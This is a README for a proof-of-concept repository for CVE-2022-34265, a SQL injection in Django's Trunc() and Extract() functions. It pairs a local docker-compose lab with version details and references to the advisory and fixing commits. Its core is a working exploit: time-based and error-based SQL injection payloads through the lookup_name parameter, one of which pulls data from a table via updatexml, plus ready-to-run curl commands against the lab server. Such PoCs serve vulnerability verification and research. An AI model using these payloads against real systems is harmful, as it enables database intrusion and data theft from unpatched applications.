# CVE-2022-34265

*PoC for CVE-2022-34265*

---

## Description

An issue was discovered in Django 3.2 before 3.2.14 and 4.0 before 4.0.6. The `Trunc()` and `Extract()` database functions are subject to SQL injection if untrusted data is used as a kind/lookup_name value. Applications that constrain the lookup name and kind choice to a known safe list are unaffected.

## How to use

### Start

```bash
git clone https://github.com/ZhaoQi99/CVE-2022-34265.git
cd CVE-2022-34265
docker-compose up -d
```

### Remove

```bash
docker-compose down
```

## Affected Versions

* Django>= 3.2, < 3.2.14

* Django >= 4.0, < 4.0.6

## Patched versions

* Django 3.2.14

* Django 4.0.6

## Verification

### Environment

* Django 4.0.5
* Python 3.8.13
* MySQL 5.7

### Payload

* `YEAR FROM start_time)) ;select sleep(5)--`

* `YEAR FROM start_time)) and updatexml(1,concat(1,(select name from TEST limit 1),1),1)--`

### Poc

```bash
curl "http://127.0.0.1:8000/extract/?lookup_name=YEAR%20FROM%20start_time))%20%3Bselect%20sleep(5)--"
curl "http://127.0.0.1:8000/extract/?lookup_name=YEAR%20FROM%20start_time))%20and%20updatexml(1%2Cconcat(1%2C(select%20name%20from%20TEST%20limit%201)%2C1)%2C1)--"
```

> PS:In the case of different databases, the existence of vulnerabilities is different. The vulnerability does not exist in the MYSQL database backend `Trunc` function.

## Reference

* [Reporter: TAKUTO YOSHIKAI](https://github.com/aeyesec/CVE-2022-34265) (using PostgreSQL)

* [django/django@`877c800`](https://github.com/django/django/commit/877c800f255ccaa7abde1fb944de45d1616f5cc9)

* [django/django@`5e2f4dd`](https://github.com/django/django/commit/5e2f4ddf2940704a26a4ac782b851989668d74db)

* [https://github.com/advisories/GHSA-p64x-8rxx-wf6q](https://github.com/advisories/GHSA-p64x-8rxx-wf6q)

* [CVE-2022-34265 Django SQL 注入漏洞调试分析 - 先知社区](https://xz.aliyun.com/t/11628)